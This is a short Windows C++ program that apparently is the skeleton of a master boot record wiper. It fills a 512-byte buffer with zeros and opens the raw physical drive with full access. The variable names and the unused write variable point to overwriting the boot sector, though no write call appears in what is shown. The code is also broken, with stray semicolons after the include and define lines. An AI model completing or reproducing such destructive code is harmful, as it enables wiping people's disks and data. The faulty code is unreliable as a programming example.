#include <iostream>;
#include <Windows.h>;

using namespace std;

#define MBR_SIZE 512;
int main()
{
	DWORD write;
	char mbrData [512];

	ZeroMemory(&mbrData, sizeof(mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}